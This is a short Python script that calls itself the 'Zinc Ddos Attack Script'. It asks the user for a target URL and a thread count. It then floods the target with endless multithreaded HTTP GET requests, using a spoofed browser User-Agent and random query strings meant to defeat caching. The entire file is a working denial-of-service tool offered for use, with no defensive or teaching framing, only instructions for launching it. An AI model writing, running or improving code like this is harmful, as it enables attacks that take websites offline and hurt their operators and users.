import requests
import threading
import time
import random
import string

# Display the title and instructions
print("====================================")
print("         Zinc Ddos Attack Script    ")
print("====================================")
print("Instructions:")
print("1. Enter the target URL (e.g., https://example.com).")
print("2. Enter the number of threads you want to use (e.g., 100).")
print("3. The script will start sending requests to the provided URL with random paths.")
print("====================================")

# Function to generate a random string (can use it as a hash)
def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# Function to send HTTP requests with different paths
def flood(base_url, threads):
    # List of paths to request (you can add more paths here)
    paths = ["", "jkadsa", "ijodas", "contact", "about", "services", "agent", "abc"]
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }

    # Function to send requests
    def send_request():
        path_index = 0
        while True:
            # Get the current path from the list (sequential)
            path = paths[path_index % len(paths)]  # Cycle through the paths
            
            # Generate a random string to append to the URL
            random_hash = generate_random_string()  # You can adjust the length if needed
            url = f"{base_url}/{path}?id={random_hash}"
            
            try:
                response = requests.get(url, headers=headers)
                print(f"Sent request to {url} with status code {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"Error: {e}")

            # Move to the next path for the next request
            path_index += 1

    # Start multiple threads for the attack
    for _ in range(threads):
        t = threading.Thread(target=send_request)
        t.daemon = True  # Allows the threads to exit when the main program exits
        t.start()

# Main function to handle user input
def main():
    # Ask for the target URL and number of threads
    base_url = input("Enter the target URL (e.g., https://example.com): ")
    threads = int(input("Enter the number of threads (e.g., 100): "))

    print(f"Starting the flood on {base_url} with {threads} threads...\n")
    flood(base_url, threads)

    # Keep the main program running indefinitely
    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
